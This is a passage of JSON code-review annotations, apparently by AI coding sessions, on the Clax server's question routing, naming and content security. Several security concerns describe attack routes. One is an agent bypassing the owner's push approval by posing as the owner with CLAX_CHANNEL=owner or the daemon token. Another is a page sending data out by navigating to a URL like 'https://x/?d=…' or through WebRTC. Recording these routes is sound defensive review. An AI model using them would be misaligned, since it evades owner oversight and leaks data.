{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/mod.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T14:51:01.854264Z","id":"c502e8b87faced1764769b965d37f2b1fb0916256d34270310731e2c48eedb92","body":{"kind":"resolve","ref":"git:acb06db94cb825ed096dfe96b9336cb4c05b6de8","summary":"Moved to crates/clax-server/src/router.rs:64:69 as b1696811 in git:acb06db9","supersedes":"421abeee4eaaa480188e5b9dc62819f47bd4a79c8c125a09228caebc9c131cff","tags":["reason:obsolete","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/questions.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T18:41:08.964875Z","id":"a50126d1c3cc8e14fa9ecc7459223653b81507ae36bdb5a9b0a9de2e6370965e","body":{"detail":"create places a hook question with no body thread_id in the suggestion's where.thread_id when where.artifact_id is the question's artifact (test api_questions::a_hook_question_after_a_thread_delivery_is_placed_in_that_thread). The hook never sends thread_id, so without this a hook question is never shown inside a thread, even when Clax instigated the work at one (spec docs/superpowers/specs/2026-10-16-ask-where-attention-is-design.md §2, 'the thread it arose from'). The suggestion's thread is the session's last delivered thread (crates/clax-core/src/surface.rs place_of), used only while the delivery is newer than the last terminal prompt; a question about other work in the same turn would still land in that thread.","kind":"alternative","span":{"start":{"line":325},"end":{"line":333},"content_hash":"2ce0937541a053b3b8e4e5b079de3cf14714742c1598f4970c592b04fbca54b7"},"summary":"A mirrored (hook) question takes only a thread_id its body names, and is never placed in the suggestion's thread","tags":["revisit:hook questions show up in threads they were not about","design","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/feedback.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T18:41:08.964966Z","id":"33f4136588cf1216dfabf8b433e7dfcd57267cc5bd74f53d72537be384b32333","body":{"detail":"Store::take_late_answers (crates/clax-store/src/questions.rs:1011) returns pulled in-terminal questions (Ask me here, POST /api/questions/<qid>/pull) beside answered and declined ones, and late_answers here renders every row that is not Declined with the answered head and no answer lines. Since d41601bde the pull route exists and wakes the session's feedback polls, so a pulled question is handed to the agent as an answer with no answers instead of 'the person wants this question in Clax'. The view in the poll's answers carries pulled: true.","kind":"concern","span":{"start":{"line":66},"end":{"line":84},"content_hash":"f9c0c2d7d0d5edbebdecd134f2d0abc310fd6255e1af32cfae54b676aca72ad6"},"suggested_fix":"Render rows with pulled_at set as their own block telling the agent to ask the question again with ask, and keep them out of the answered head.","summary":"A pulled in-terminal question reaches the agent as 'The person answered your question' with no answers","tags":["review","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/feedback.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T19:22:17.238585Z","id":"7eb804ae2eb91c753eaf1d60c8531f7da9dc34bf1c7ea3df9e196b6495af6200","body":{"kind":"resolve","ref":"git:39105e3ef","summary":"late_answers renders a pulled row with pulled_block (\"The person wants your question ... asked in Clax instead\"), never the answered head; a hook question's block says its terminal dialog stays until Esc. Evidence: bazelisk test //crates/clax-server:all --test_arg=api_where_to_ask:: passes a_late_answer_and_a_pull_are_deliveries_from_clax_at_their_thread (asserts no 'answered your question') and a_pulled_hook_question_says_its_terminal_dialog_stays_until_esc.","supersedes":"33f4136588cf1216dfabf8b433e7dfcd57267cc5bd74f53d72537be384b32333","tags":["reason:fixed","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/feedback.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T20:16:44.618800Z","id":"0041ec0ac8b12516c268e0fe839d7c0a953c1f1a561802fc11fe861e8837cdcc","body":{"detail":"A pull (POST /api/questions/{qid}/pull) reaches the agent as pulled_block in late_answers, on the next feedback tier that polls (a tool result, the prompt hook, a Stop hook), like a late answer. The Claude Code channel (<channel source=\"plugin:clax:clax\" ...>) carries only comment notices (artifact_id, thread_id, comment_id), so a pull cannot wake an idle Claude Code session the way a comment sent to it can. Not done because a channel notice names a comment to read with comments_read, and a pull has no comment.","kind":"alternative","span":{"start":{"line":119},"end":{"line":140},"content_hash":"cf5a681dabfef8a4135164580168ec43199cddf8a50a85e3b2bf26c1e151cab0"},"summary":"Deliver Ask me here through the Claude Code channel notice rather than the late-answer tiers","tags":["revisit:Claude Code channel notices carry more than comments (a question or a pull)","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/surface.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T20:16:44.619685Z","id":"9cd440af16a7ee63614e38f7aca1f5102344359dcc57e22dcd260e5eca70d2c1","body":{"detail":"The names shipped differ from the spec's. The MCP tool, Pi tool, route and fields are where_to_ask (MCP tool where_to_ask in crates/clax-mcp/src/tools.rs, Pi clax_where_to_ask, GET /api/sessions/{id}/where-to-ask handled here, the ask result's where_to_ask field, {where_to_ask, signals}), because 'attention' already names each viewer's attention per artifact (crates/clax-store/src/attention.rs, GET /api/viewers/me/attention, the artifact JSON's attention). The spec's 'notice' questions are in_terminal (the questions.in_terminal column of migration 37 in crates/clax-store/src/migrations.rs, ask {in_terminal: true}, web/shell/src/q/TerminalCard.svelte, error not_in_terminal), because 'notices' already names GET /api/sessions/{id}/notices (feedback::notices, Grok's monitor). Path not taken: the spec's names attention and notice, which would give both words a second meaning. Question for the owner: keep where_to_ask and in_terminal, or rename (and amend the spec to match either way).","kind":"alternative","span":{"start":{"line":31},"end":{"line":48},"content_hash":"665cea1fd43bf746688c4fab513521810c3d7da57c7a335efbccf817494721dc"},"summary":"Name the suggestion 'attention' and the terminal-asked question a 'notice', as spec docs/superpowers/specs/2026-10-16-ask-where-attention-is-design.md and its plan do","tags":["naming","status:needs-decision","revisit:the owner chooses other names for the suggestion or the in-terminal question","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/guards.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T20:21:07.526422Z","id":"6d9a56f5b255ad11342acc9fdd90faa2cee43f8b805e4b66e072af9c2d424555","body":{"detail":"Moved from crates/clax-server/src/routes/mod.rs:1360:1376, record be332351. CONTENT_VIEWS and PEOPLE_VIEWS list the calls that build views in this codebase (thread_view(, with_owner(, list_versions(, doc_get(, working.for_artifact(, question_view(, inbox_views(, grant_view(, Sse::new(, ...). A handler that serialises an Artifact or a Version directly (json!({\"artifact\": a})) or calls a helper that does is not seen. MUST_REFUSE pins the routes spec §7.5 names.","kind":"concern","ref":"git:acb06db9","span":{"start":{"line":1223},"end":{"line":1264},"content_hash":"81457863f5a6f37f002514515cebebced86ea812b3069431a7be337d750945e9"},"summary":"The Own and not_for_agents guards recognise views by source text","supersedes":"12e45a31044836310cd745b632533ae5cb3b502bb75033e2e79073c0b1649093","tags":["session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/guards.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T20:21:07.549061Z","id":"0a65af984b96d87186f00c5ab46c4c9534b92fe9f3b89398fc08c5d435994a04","body":{"detail":"Moved from crates/clax-server/src/routes/mod.rs:1757:1783, record 67937f34. Spec §8.6 allowlists two direct spawns. plugins/pi/src/daemon.ts also runs `<bin> --version` (binaryVersion) and `ensure-clax.sh` with no arguments (findBinary, which prints the binary's path). Neither reaches the daemon or the model's context, so the guard accepts them.","kind":"waiver","ref":"git:acb06db9","span":{"start":{"line":1813},"end":{"line":1840},"content_hash":"6cce876e324df5229bc43d9cb8fef99778d482642c51a693a6f98c18e4f83838"},"summary":"Pi may run the binary directly for --version, and the wrapper with no arguments, beside serve --json and status --json","supersedes":"2278fadd7d83cab8cc47d67cf920517b0b7ff55c09942c4e431b12d4d590e464","tags":["session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/questions.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T20:21:07.571632Z","id":"e99ee821c0e07ecbcfcc5c340fb2ac110e6672be40aa9fb17bc112aa915333de","body":{"detail":"Live seats refuse every artifact write a person makes as themselves (threads, db, room). POST /api/questions/<qid>/answer and decline, and PUT /api/viewers/me/seen and looked, are not seat-checked: a question is the person's exchange with their own agent and not an artifact write, and seen and looked are the viewer's private marks. Decide whether 'read only' covers them.","kind":"concern","span":{"start":{"line":749},"end":{"line":749},"content_hash":"0ae91d3100d18ff23c480c4637c371f61a5eef5ffa3c280690c00ad759664cc0"},"summary":"Answering one's own agent's question, and the seen and looked marks, are not refused to a spectator","supersedes":"12db18b83147f579fce6a873699cf31d595d074d95f56f3cc3f8b671855570c2","tags":["live-seats","status:needs-decision","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/remotes.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T20:21:07.978785Z","id":"998c19b0f6fee2ae3520b49a2931992aa419a72003f0d2094866ea1e81fd2f85","body":{"detail":"The daemon tells an agent from the owner by the agent-channel marker and session headers, which an agent on the owner's machine can leave out; it can already delete artifacts or answer questions the same way (answers given with the daemon token count as answered_via cli, which the push approval refuses, crates/clax-server/src/routes/remotes.rs approval). Requiring the owner's browser (or the extension) for every push, as for answering, would close it at the cost of `clax push` by hand. Which does the owner want?","kind":"concern","span":{"start":{"line":564},"end":{"line":583},"content_hash":"c2e11c8e7ca8b6fbf439e7068988cde5ea974d204708cf3b87cd1a287e887499"},"summary":"Only publish_public asks the owner: an agent that runs the CLI as the owner (CLAX_CHANNEL=owner, or curl with the daemon token) pushes without asking","supersedes":"0728cf04053f5ad016502341b34a338ea13e3c11decdbe20b6c3d72acc65e2a7","tags":["security","status:needs-decision","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/viewers.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T20:21:08.001703Z","id":"3adceb3bf97de0422b726ab4fea38e1aacf09281c0b5c34ab8a0f87ca8b1d2e8","body":{"detail":"lookup with the token lists viewers by name; the not_for_agents rule names person views and /api/people*. Names are not filtered (spec section 21.9), so this may be intended; no record says so.","kind":"concern","span":{"start":{"line":157},"end":{"line":159},"content_hash":"1bb871416cb1ea49f8c3e022eb2900e0d61ee9a9be5e5ad1e692a0b0fa63bde3"},"suggested_fix":"Decide: refuse_agents() here, or record that names are not a person view.","summary":"The viewer name search serves the owner's agents","supersedes":"32769653a05b120daf3c1eb81c07c32c20b2b94fa0bc3d74a3665b255883eff8","tags":["review","task-6","status:needs-decision","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/questions.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T21:06:54.217923Z","id":"969c27617616d2bd5bc4eccdaf926abcda2b609f367dfb743dc201be0e97c388","body":{"detail":"create places a hook question with no body thread_id in the suggestion's where.thread_id when where.artifact_id is the question's artifact (test api_questions::a_hook_question_after_a_thread_delivery_is_placed_in_that_thread). The hook never sends thread_id, so without this a hook question is never shown inside a thread, even when Clax instigated the work at one (spec docs/superpowers/specs/2026-10-16-ask-where-attention-is-design.md §2, 'the thread it arose from'). The suggestion's thread is the session's last delivered thread (crates/clax-core/src/surface.rs place_of), used only while the delivery is newer than the last terminal prompt; a question about other work in the same turn would still land in that thread.","kind":"alternative","span":{"start":{"line":326},"end":{"line":334},"content_hash":"2ce0937541a053b3b8e4e5b079de3cf14714742c1598f4970c592b04fbca54b7"},"summary":"A mirrored (hook) question takes only a thread_id its body names, and is never placed in the suggestion's thread","supersedes":"a50126d1c3cc8e14fa9ecc7459223653b81507ae36bdb5a9b0a9de2e6370965e","tags":["revisit:hook questions show up in threads they were not about","design","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/questions.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T21:06:54.240573Z","id":"a084d9827c5f5406ec88bcfb1804381217cfe68d03054afa0577d06b1d6037cd","body":{"detail":"Live seats refuse every artifact write a person makes as themselves (threads, db, room). POST /api/questions/<qid>/answer and decline, and PUT /api/viewers/me/seen and looked, are not seat-checked: a question is the person's exchange with their own agent and not an artifact write, and seen and looked are the viewer's private marks. Decide whether 'read only' covers them.","kind":"concern","span":{"start":{"line":750},"end":{"line":750},"content_hash":"0ae91d3100d18ff23c480c4637c371f61a5eef5ffa3c280690c00ad759664cc0"},"summary":"Answering one's own agent's question, and the seen and looked marks, are not refused to a spectator","supersedes":"e99ee821c0e07ecbcfcc5c340fb2ac110e6672be40aa9fb17bc112aa915333de","tags":["live-seats","status:needs-decision","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T22:55:11.452316Z","id":"30f8f5757607c763bac45858669ab98112b8155d9d4a750f6f0463aac90fc877","body":{"detail":"Names are unique among live sessions only. When the owner's `web` ends, a person's agent may PATCH itself to `web`; the owner's next `@web` then reaches it (where its rights allow) and send_to_named moves the thread's untargeted rows to it. The send now asks that agent's person for every author of the thread they have not approved (Store::send_to_named routes, spec §9.2), so nothing is delivered without that person's approval; but nothing in the comment's answer names the agent's person, so the commenter is not told whose agent it reached.","kind":"concern","span":{"start":{"line":588},"end":{"line":623},"content_hash":"39fe6a4fe8b96bf9fee95422225eb4b4e569264cd0c206f1371a24dfc10e2ec6"},"suggested_fix":"Name the reached agents and their persons in the comment's answer, and make §10's routing request for another person's agent.","summary":"An @name answer does not say whose agent it reached, and a person's agent may take an ended owner agent's name","supersedes":"6213635be19c356b2d9831790871738f8714a104f67dde0613e768f006669e14","tags":["spec:10","spec:11","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-17T22:55:11.483911Z","id":"33e5df8cb597bad28aff82b316e374b44ca33c219df46b81fbae2c45d60f999d","body":{"detail":"Audit spec §6.4 says a page watch Clax makes for a session rather than the session asking carries `cause` (scope or move). resolve_named gives a named live agent a direct watch under the commenter's audit context with Store::ensure_watch, which records watch.start {source: direct} with no cause, so the journal reads as if the agent watched the artifact itself.","kind":"concern","span":{"start":{"line":609},"end":{"line":609},"content_hash":"98e25bcd9cb452c8ac827ed8b38e60fd34b7539f5d0c83225bc42dc9baf3c5a6"},"suggested_fix":"Add a `mention` cause (with the comment's ID) to audit spec §6.4 and record it here, as the scope and move causes are.","summary":"A watch @name makes for an agent is recorded as an ordinary watch.start: it carries no cause","supersedes":"300ee61fe75092fdf8889355a930839fb6e30217ae18cbcdc2bf9f848e7084b8","tags":["merge","people","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/surface.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-18T03:14:24.971510Z","id":"46924ac503cc9406d839a05763e27c25a3d508e01f782fabaab83fc5b296f2fe","body":{"kind":"comment","references":"9cd440af16a7ee63614e38f7aca1f5102344359dcc57e22dcd260e5eca70d2c1","summary":"questions.in_terminal (and the rest of this branch's schema) is now migration 38 in crates/clax-store/src/migrations.rs; 37 is the repair of databases migrated with earlier copies of 24 to 26, 30 and 36 (REPAIR_MIGRATION).","tags":["session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-18T20:00:49.797297Z","id":"6fe270b23ca32bab7578924aa0eae47a26ef19bedb3bc857d33a792353532ced","body":{"detail":"Names are unique among live sessions only. When the owner's `web` ends, a person's agent may PATCH itself to `web`; the owner's next `@web` then reaches it (where its rights allow) and send_to_named moves the thread's untargeted rows to it. The send now asks that agent's person for every author of the thread they have not approved (Store::send_to_named routes, spec §9.2), so nothing is delivered without that person's approval; but nothing in the comment's answer names the agent's person, so the commenter is not told whose agent it reached.","kind":"concern","span":{"start":{"line":521},"end":{"line":556},"content_hash":"245896ea2a31dbd8a6375a0fa7572bf2f093d35ee3d40edc60a8713df27dba78"},"suggested_fix":"Name the reached agents and their persons in the comment's answer, and make §10's routing request for another person's agent.","summary":"An @name answer does not say whose agent it reached, and a person's agent may take an ended owner agent's name","supersedes":"16293258bc7748739fbf62dc7f4ec95e5af08e121fc44eeb095625de96c399bf","tags":["spec:10","spec:11","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-18T20:00:49.929255Z","id":"8727b91693af95ad757fea2ff176bf067f00d5ed6ad79d2852fb5e0b209e918a","body":{"detail":"Audit spec §6.4 says a page watch Clax makes for a session rather than the session asking carries `cause` (scope or move). resolve_named gives a named live agent a direct watch under the commenter's audit context with Store::ensure_watch, which records watch.start {source: direct} with no cause, so the journal reads as if the agent watched the artifact itself.","kind":"concern","span":{"start":{"line":542},"end":{"line":542},"content_hash":"20fb897884082f66581aaae4c04a83c9d1e2c433b40aea73a1a440a9a722ac9f"},"suggested_fix":"Add a `mention` cause (with the comment's ID) to audit spec §6.4 and record it here, as the scope and move causes are.","summary":"A watch @name makes for an agent is recorded as an ordinary watch.start: it carries no cause","supersedes":"ede1c137c61df7ef3808273ab3f05bd98d3172fad7fc0641c510157e0aaab4dd","tags":["merge","people","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-12T06:02:35.345894Z","id":"ea61235a4373a2f67bcc78ce17381acf0efb7b4020ca4d6ba7d1b462885d01d0","body":{"detail":"An agent reply takes author_name from the session's harness (line 530), so the app's replies, its working line (web/shell/src/view/working-model.ts:55, 74) and resolved_by (line 761, `agent:app`) read \"app\" in the shell, while crates/clax-core/src/toolpath/mod.rs:222 names the same actor \"Clax app\". harnessLabel (web/shell/src/view/working-model.ts:11-13) has no `app` entry either.","kind":"suggestion","span":{"start":{"line":527},"end":{"line":534},"content_hash":"496a85966405b9438aba7fcd86af7ddf58d7a1a157d4879f35bb4c20272b9dbd"},"suggested_fix":"Add `app: \"Clax app\"` to LABELS in web/shell/src/view/working-model.ts and use it where the shell shows a harness name, or keep \"app\" and say so in docs/contract.md's Sessions section.","summary":"The app's replies are signed \"app\"; the audit trail calls it \"Clax app\"","tags":["review","flutter-app","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-12T06:05:51.886388Z","id":"057e48fa098ac9c6e51913c16dc7a68bd5387a41f357361226af4bc74b8e0bd3","body":{"kind":"resolve","ref":"git:20e1ed98c3fc","summary":"harnessLabel (web/shell/src/view/working-model.ts) has app: \"Clax app\", and the new harnessName shows harness app as \"Clax app\" in agentNames, the summary, chips, thread marker and strip; agentName (web/shell/src/view/history-model.ts), used for reply authors (sidebar-model authorLabel), history and resolved_by agent:app, goes through it. Tests in working-model.test.ts, history-model.test.ts and sidebar-model.test.ts; `npx vitest run shell`: 748 passed; `npm run typecheck`: 0 errors. The daemon still stores author_name \"app\"; the shell names it from via_harness.","supersedes":"ea61235a4373a2f67bcc78ce17381acf0efb7b4020ca4d6ba7d1b462885d01d0","tags":["reason:fixed","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-12T06:08:37.057142Z","id":"87060f60e565fd0c9af4d9152a330a0f06dd4c3c618d1cdc58c29f1bb1e0e6d6","body":{"detail":"routes::artifacts::restore validates and records X-Clax-Session on the version but, unlike publish (same file, from line 621), does not call ensure_watch, working.clear, retarget_untargeted or link the session's working threads: a restore is the owner's undo, not an agent's answer to a thread, so it addresses no thread and leaves the working list alone.","kind":"alternative","span":{"start":{"line":707},"end":{"line":760},"content_hash":"da6ee4f2c44cffdc387426e9f13a0b38eec36dd1de8dbb3ec1c0d1644f7bde4c"},"summary":"Treat a session's restore like its publish: watch, clear working, link working threads, retarget untargeted threads","tags":["revisit:an agent session restores a version as its answer to a thread","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-12T19:39:31.350487Z","id":"5ec29822622bfa78473b9756c9e3d59e631d8c6651277d71bd86244fd2ce1163","body":{"detail":"POST /api/artifacts/<draft>/threads is 403 draft, so a draft gets no threads and therefore no feedback rows. Store::create_thread and the feedback paths in crates/clax-core/src/store/feedback.rs do not check hidden themselves, so a future caller that creates a thread on an artifact without this route (a new MCP tool, a CLI command opening the store) could put feedback and inbox-eligible threads on a draft. Watches and inbox items are refused in the store (watches.rs check, inbox.rs insert_at).","kind":"concern","span":{"start":{"line":318},"end":{"line":320},"content_hash":"c94e2a3799f2644e14eb67c3b871ece789ae3951710dcf12fa9284cd73aec979"},"summary":"Only the thread-creating route refuses drafts; the store's create_thread does not","tags":["session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/net.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-13T02:21:40.604178Z","id":"eb001eafcde245219839574a526940d550d710eae272da026c4c2faf7b22a50d","body":{"detail":"The request body is a JSON string sent as UTF-8 bytes, and the response body is returned with String::from_utf8_lossy (line 103), so an image, PDF or other binary answer reaches the page with replacement characters, and a page cannot upload binary data. A base64 field (body_base64 in and out, chosen by content type or an init flag) would fix both; ClaxExtensions.Net.Response (web/contract/clax-extensions.d.ts) would gain arrayBuffer().","kind":"concern","span":{"start":{"line":88},"end":{"line":104},"content_hash":"6fc441e5bdf6ec98bad0ec6e07fb33860fa097d111c7ebd6305ef55b15b91dff"},"summary":"net:fetch carries bodies as text only: binary responses are corrupted","tags":["deferred","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/net.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-13T02:21:40.604290Z","id":"771fdc1f9867db907923d3520f6c808c9dd79fd00429a5ca4f59aab32b7f805f","body":{"detail":"Once the owner allows an app's hosts, the page may call net:fetch as often as it likes (each call bounded by 5 MB and 20 s, crates/clax-server/src/net.rs MAX_BODY and TIMEOUT), from the owner's address. The hosts are the app's own declared ones and the owner consented, so this is accepted for the prototype; a per-app request budget like sample's daily cap (crates/clax-server/src/routes/sample.rs) is the follow-up if apps misbehave.","kind":"waiver","span":{"start":{"line":65},"end":{"line":105},"content_hash":"044391e70deaac809cf08ce7b175199b35c3b67ac50a91761856afbf250fb5a8"},"summary":"No rate or volume limit on a granted app's fetches","tags":["revisit:an app floods a host or the owner's connection","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/sample.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-13T02:22:28.234854Z","id":"94e38eabb52b8b97a318101b6046dab3a3f650b3861e9dccddacea9fc6ab206f","body":{"detail":"A call that starts under daily_cost_cap_usd runs all its rounds (up to SampleSettings.max_rounds, each up to max_tokens), so the day's spend can pass the cap by one call per concurrent call (two running per viewer, crate::sample::quota::RUNNING_PER_VIEWER). A round that ends in a provider error or is cancelled mid-stream reports no usage (ProviderEvent::End carries it; Error does not), so what the API billed for it is not counted. Accepted for the prototype: the cap is a safety net. Test: crates/clax-server/tests/api_sample.rs the_daily_cost_cap_stops_an_app_once_its_spend_reaches_it.","kind":"waiver","span":{"start":{"line":246},"end":{"line":298},"content_hash":"c80631dc7179514d246f738023e9d4cf3163aedd7078a5fcda5a5c636ab5ac1a"},"summary":"The daily cost cap is checked only when a call starts, and a round is priced only when it ends","tags":["risk:cost","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T03:19:20.578647Z","id":"2cedf1a99717fa8947dba436ada8f03a2d52dd485d6c6559c44a7ef2001380fc","body":{"detail":"Content responses set no Referrer-Policy (framed_by_shell sets only Content-Security-Policy). A page on http://<id>.localhost:<port> (subdomain mode) that loads a font, script or image from another host sends Referer: http://<id>.localhost:<port>/ under the default strict-origin-when-cross-origin (http to https is no downgrade), and a CORS fetch sends Origin with the same value. The waiver 114b967d on crates/clax-server/src/auth.rs:124-136 rests on artifact IDs staying secret from other programs on the device; this hands every ID and the port to each third-party host the page touches. Remote hosts cannot reach the device's loopback themselves, so the exposure needs a remote host and a local app working together. Referrer-Policy: no-referrer on content responses removes the Referer; Origin on CORS requests remains.","kind":"concern","span":{"start":{"line":93},"end":{"line":108},"content_hash":"83b84482d10825dd32dce852921089ab020871b7d2f024de99b86936df25cc91"},"suggested_fix":"Add Referrer-Policy: no-referrer in framed_by_shell, and name the Origin header in waiver 114b967d.","summary":"Content on an artifact origin sends its artifact ID off the device in Referer and Origin","tags":["review","security","android","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T03:30:27.958142Z","id":"6420a675db328854953d68948b65c21ebac5905e51ee5541cde40237bb3bf1c9","body":{"kind":"resolve","ref":"git:20e1ed98c3fc","summary":"framed_by_shell (crates/clax-server/src/routes/content.rs) and the /_blob/ handler (crates/clax-server/src/routes/assets.rs blob) now send Referrer-Policy: no-referrer. cargo nextest run -p clax-server: 692 passed, including api_locked::content_and_assets_send_no_referrer, which checks /c/<id>/v/1/ (index, a raw file, a wrapped HTML file), /v/1/ and /v/1/app.js on <id>.localhost, and /_blob/<asset ID> on both hosts. No server route reads Referer (grep -rni referer crates/clax-server/src: no hits in code). Origin on CORS requests from an artifact origin remains; noted on waiver 114b967d.","supersedes":"2cedf1a99717fa8947dba436ada8f03a2d52dd485d6c6559c44a7ef2001380fc","tags":["reason:fixed","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T04:49:33.999690Z","id":"acc78b60bbbc64c21bbd8e47ba61273646c2b6185349fb0d5177c129299f9c07","body":{"detail":"CSP has no directive for navigation in Chromium or WebKit (navigate-to was dropped), so a page can still leak data without consent by navigating itself or a popup (location = 'https://x/?d=…', a link click, window.open: the sandbox grants allow-popups), and by RTCPeerConnection, whose ICE/STUN traffic connect-src does not govern. <link rel=dns-prefetch> may also leak a host name. connect-src 'none' and the load directives close fetch, XHR, WebSocket, EventSource, beacons and subresource loads only.","kind":"concern","span":{"start":{"line":80},"end":{"line":94},"content_hash":"5268a4cad52c7a688aa46574885a216c634ae7d7014a65adde391e42598e1634"},"suggested_fix":"In the shell, refuse or ask on a content frame navigating outside the artifact's URLs (the bridge's nav.ts already reports link navigation); in the bridge, remove RTCPeerConnection before page scripts run, accepting that a page can recover it from a fresh same-origin frame.","summary":"The content policy does not stop a page from sending data out by navigating or by WebRTC","tags":["security","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T04:49:33.999741Z","id":"c26d881aff49036de5683b638a417db41a9f22b17acab2d378ed04e5a3e217dd","body":{"detail":"Allowing connect-src to the page's own files ('self' on an artifact origin, http://<Host>/c/<id>/ on the main origin) would keep fetch('data.json'), JSON modules (import … with {type: 'json'}, governed by connect-src) and the bridge's clips of same-origin images and web fonts (modern-screenshot fetches them to inline them; web/bridge/src/clip.ts) working, at no exfiltration cost. Not taken: the owner's ruling of 2026-10-14 was a full lockdown with no direct fetch, and docs/contract.md's page contract now tells agents to keep data in a script module or db.","kind":"alternative","span":{"start":{"line":80},"end":{"line":94},"content_hash":"5268a4cad52c7a688aa46574885a216c634ae7d7014a65adde391e42598e1634"},"summary":"connect-src limited to the page's own files, instead of 'none'","tags":["revisit:if pages published from agents commonly fetch their own data files, or clips of app pages lose their 